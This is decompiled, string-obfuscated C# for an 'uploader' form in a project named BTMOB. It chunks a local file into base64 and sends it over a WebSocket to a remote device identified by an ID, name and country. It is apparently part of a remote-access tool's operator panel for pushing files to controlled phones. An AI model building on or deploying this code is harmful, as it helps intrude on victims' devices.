using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using BTMOB.My.Resources;
using DrakeUI.Framework;
using Microsoft.VisualBasic.CompilerServices;

namespace BTMOB;

[DesignerGenerated]
public class uploader : basestyle
{
	[CompilerGenerated]
	internal sealed class _Closure_0024__33_002D0
	{
		public long _0024VB_0024Local_totalBytesRead;

		public long _0024VB_0024Local_totalBytes;

		public uploader _0024VB_0024Me;

		public VB_0024AnonymousDelegate_0 _0024I0;

		public _Closure_0024__33_002D0(_Closure_0024__33_002D0 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024Local_totalBytesRead = arg0._0024VB_0024Local_totalBytesRead;
				_0024VB_0024Local_totalBytes = arg0._0024VB_0024Local_totalBytes;
			}
		}

		[SpecialName]
		internal void _Lambda_0024__0()
		{
			int value = checked((int)Math.Round((double)_0024VB_0024Local_totalBytesRead / (double)_0024VB_0024Local_totalBytes * 100.0));
			_0024VB_0024Me.uploadprogress.Value = value;
			_0024VB_0024Me.senttext.Text = codes.BytesToText(_0024VB_0024Local_totalBytesRead);
		}
	}

	private IContainer components;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("uploadworker")]
	private BackgroundWorker _uploadworker;

	public BTClient Btcli;

	public string filePath;

	public string filename;

	public string savepath;

	public string mobid;

	[field: AccessedThroughProperty("PictureBox1")]
	internal virtual PictureBox PictureBox1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("uploadprogress")]
	internal virtual DrakeUITrackBar uploadprogress
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual BackgroundWorker uploadworker
	{
		[CompilerGenerated]
		get
		{
			return _uploadworker;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			DoWorkEventHandler value2 = uploadworker_DoWork;
			BackgroundWorker backgroundWorker = _uploadworker;
			if (backgroundWorker != null)
			{
				backgroundWorker.DoWork -= value2;
			}
			_uploadworker = value;
			backgroundWorker = _uploadworker;
			if (backgroundWorker != null)
			{
				backgroundWorker.DoWork += value2;
			}
		}
	}

	[field: AccessedThroughProperty("fnametext")]
	internal virtual Label fnametext
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("totaltext")]
	internal virtual Label totaltext
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("senttext")]
	internal virtual Label senttext
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	public uploader()
	{
		base.Load += uploader_Load;
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			base.Dispose(disposing);
		}
	}

	[System.Diagnostics.DebuggerStepThrough]
	private void InitializeComponent()
	{
		System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(BTMOB.uploader));
		this.PictureBox1 = new System.Windows.Forms.PictureBox();
		this.uploadprogress = new DrakeUI.Framework.DrakeUITrackBar();
		this.uploadworker = new System.ComponentModel.BackgroundWorker();
		this.fnametext = new System.Windows.Forms.Label();
		this.totaltext = new System.Windows.Forms.Label();
		this.senttext = new System.Windows.Forms.Label();
		((System.ComponentModel.ISupportInitialize)this.myscr).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.myico).BeginInit();
		this.tobpanelsti.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.PictureBox1).BeginInit();
		base.SuspendLayout();
		this.myscr.Enabled = false;
		this.myscr.Visible = false;
		this.pinbtn.Location = new System.Drawing.Point(473, 5);
		this.minibtn.Location = new System.Drawing.Point(515, 5);
		this.closbtn.Location = new System.Drawing.Point(557, 5);
		this.mytitle.Location = new System.Drawing.Point(5, 4);
		this.mytitle.Size = new System.Drawing.Size(589, 18);
		this.tobpanelsti.Padding = new System.Windows.Forms.Padding(5, 4, 5, 4);
		this.tobpanelsti.Size = new System.Drawing.Size(599, 26);
		this.PictureBox1.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.PictureBox1.Dock = System.Windows.Forms.DockStyle.Right;
		this.PictureBox1.Image = BTMOB.My.Resources.Resources.uploading;
		this.PictureBox1.Location = new System.Drawing.Point(512, 64);
		this.PictureBox1.Name = EXGuarder._76402B1F;
		this.PictureBox1.Size = new System.Drawing.Size(89, 123);
		this.PictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
		this.PictureBox1.TabIndex = 40;
		this.PictureBox1.TabStop = false;
		this.uploadprogress.DisableColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.uploadprogress.Dock = System.Windows.Forms.DockStyle.Bottom;
		this.uploadprogress.Enabled = false;
		this.uploadprogress.FillColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.uploadprogress.Font = new System.Drawing.Font(EXGuarder._66204E5D, 12f);
		this.uploadprogress.ForeColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.uploadprogress.Location = new System.Drawing.Point(2, 173);
		this.uploadprogress.Name = EXGuarder._231A6425;
		this.uploadprogress.ReadOnly = true;
		this.uploadprogress.RectColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.uploadprogress.Size = new System.Drawing.Size(510, 14);
		this.uploadprogress.Style = DrakeUI.Framework.UIStyle.Custom;
		this.uploadprogress.TabIndex = 43;
		this.uploadprogress.Text = EXGuarder._791B0C09;
		this.fnametext.Dock = System.Windows.Forms.DockStyle.Top;
		this.fnametext.Font = new System.Drawing.Font(EXGuarder._66204E5D, 9f, System.Drawing.FontStyle.Bold);
		this.fnametext.ForeColor = System.Drawing.Color.Transparent;
		this.fnametext.Location = new System.Drawing.Point(2, 64);
		this.fnametext.Name = EXGuarder._4A192233;
		this.fnametext.Size = new System.Drawing.Size(510, 32);
		this.fnametext.TabIndex = 44;
		this.fnametext.Text = EXGuarder._25193C21;
		this.fnametext.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
		this.totaltext.Dock = System.Windows.Forms.DockStyle.Top;
		this.totaltext.Font = new System.Drawing.Font(EXGuarder._66204E5D, 9f, System.Drawing.FontStyle.Bold);
		this.totaltext.ForeColor = System.Drawing.Color.Transparent;
		this.totaltext.Location = new System.Drawing.Point(2, 96);
		this.totaltext.Name = EXGuarder._2B181054;
		this.totaltext.Size = new System.Drawing.Size(510, 32);
		this.totaltext.TabIndex = 45;
		this.totaltext.Text = EXGuarder._4E361546;
		this.totaltext.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
		this.senttext.Dock = System.Windows.Forms.DockStyle.Top;
		this.senttext.Font = new System.Drawing.Font(EXGuarder._66204E5D, 9f, System.Drawing.FontStyle.Bold);
		this.senttext.ForeColor = System.Drawing.Color.Transparent;
		this.senttext.Location = new System.Drawing.Point(2, 128);
		this.senttext.Name = EXGuarder._6E6D4F37;
		this.senttext.Size = new System.Drawing.Size(510, 32);
		this.senttext.TabIndex = 46;
		this.senttext.Text = EXGuarder._64227660;
		this.senttext.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
		base.AutoScaleDimensions = new System.Drawing.SizeF(8f, 18f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		this.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		base.ClientSize = new System.Drawing.Size(603, 189);
		base.Controls.Add(this.senttext);
		base.Controls.Add(this.totaltext);
		base.Controls.Add(this.fnametext);
		base.Controls.Add(this.uploadprogress);
		base.Controls.Add(this.PictureBox1);
		base.Icon = (System.Drawing.Icon)resources.GetObject(EXGuarder._4748406A);
		this.MaximumSize = new System.Drawing.Size(603, 189);
		this.MinimumSize = new System.Drawing.Size(603, 189);
		base.Name = EXGuarder._00201A1D;
		this.Text = EXGuarder._1D73482B;
		base.Controls.SetChildIndex(this.tobpanelsti, 0);
		base.Controls.SetChildIndex(this.PictureBox1, 0);
		base.Controls.SetChildIndex(this.uploadprogress, 0);
		base.Controls.SetChildIndex(this.fnametext, 0);
		base.Controls.SetChildIndex(this.totaltext, 0);
		base.Controls.SetChildIndex(this.senttext, 0);
		((System.ComponentModel.ISupportInitialize)this.myscr).EndInit();
		((System.ComponentModel.ISupportInitialize)this.myico).EndInit();
		this.tobpanelsti.ResumeLayout(false);
		((System.ComponentModel.ISupportInitialize)this.PictureBox1).EndInit();
		base.ResumeLayout(false);
	}

	private void uploadworker_DoWork(object sender, DoWorkEventArgs e)
	{
		_Closure_0024__33_002D0 arg = default(_Closure_0024__33_002D0);
		_Closure_0024__33_002D0 CS_0024_003C_003E8__locals12 = new _Closure_0024__33_002D0(arg);
		CS_0024_003C_003E8__locals12._0024VB_0024Me = this;
		FileInfo fileInfo = new FileInfo(filePath);
		CS_0024_003C_003E8__locals12._0024VB_0024Local_totalBytes = fileInfo.Length;
		int num = codes.CalculateBufferSize(CS_0024_003C_003E8__locals12._0024VB_0024Local_totalBytes);
		checked
		{
			byte[] array = new byte[num - 1 + 1];
			CS_0024_003C_003E8__locals12._0024VB_0024Local_totalBytesRead = 0L;
			int num2 = 0;
			string value = codes.CalculateMD5(filePath);
			using (FileStream fileStream = new FileStream(filePath, FileMode.Open, FileAccess.Read))
			{
				int num3;
				do
				{
					num3 = fileStream.Read(array, 0, array.Length);
					if (num3 > 0)
					{
						CS_0024_003C_003E8__locals12._0024VB_0024Local_totalBytesRead += num3;
						string value2 = Convert.ToBase64String(array, 0, num3);
						Dictionary<string, object> dictionary = new Dictionary<string, object>();
						dictionary.Add(EXGuarder._77085870, value);
						dictionary.Add(EXGuarder._5F634F21, savepath);
						dictionary.Add(EXGuarder._681C7003, EXGuarder._5A5F0D40);
						dictionary.Add(EXGuarder._346E720D, EXGuarder._5A5F0D40);
						dictionary.Add(EXGuarder._1A0E1162, fileInfo.Name);
						dictionary.Add(EXGuarder._3A091B4D, value2);
						dictionary.Add(EXGuarder._39061B72, CS_0024_003C_003E8__locals12._0024VB_0024Local_totalBytes);
						dictionary.Add(EXGuarder._001C5927, CS_0024_003C_003E8__locals12._0024VB_0024Local_totalBytesRead);
						dictionary.Add(EXGuarder._5773472C, num2);
						dictionary.Add(EXGuarder._27574D68, EXGuarder._01451C57);
						Dictionary<string, object> chatData = dictionary;
						BTEngine.commands(chatData, mobid, Btcli.Serverins.WSClient);
						num2++;
						Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
						{
							int value3 = (int)Math.Round((double)CS_0024_003C_003E8__locals12._0024VB_0024Local_totalBytesRead / (double)CS_0024_003C_003E8__locals12._0024VB_0024Local_totalBytes * 100.0);
							CS_0024_003C_003E8__locals12._0024VB_0024Me.uploadprogress.Value = value3;
							CS_0024_003C_003E8__locals12._0024VB_0024Me.senttext.Text = codes.BytesToText(CS_0024_003C_003E8__locals12._0024VB_0024Local_totalBytesRead);
						}));
						Thread.Sleep(10);
					}
				}
				while (num3 > 0);
			}
			Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
			{
				uploadprogress.ForeColor = Color.Lime;
				PictureBox1.Image = Resources.ok_con;
			}));
		}
	}

	private void uploader_Load(object sender, EventArgs e)
	{
		myico.Image = Btcli.wallpaper;
		mytitle.Text = BTConst.uploadingstr + EXGuarder._10545D3E + Btcli.name + EXGuarder._10545D3E + Btcli.country;
		uploadprogress.Value = 0;
		fnametext.Text = filename;
		FileInfo fileInfo = new FileInfo(filePath);
		long length = fileInfo.Length;
		totaltext.Text = codes.BytesToText(length);
		senttext.Text = EXGuarder._711E1661;
		if (!uploadworker.IsBusy)
		{
			uploadworker.RunWorkerAsync();
		}
	}
}
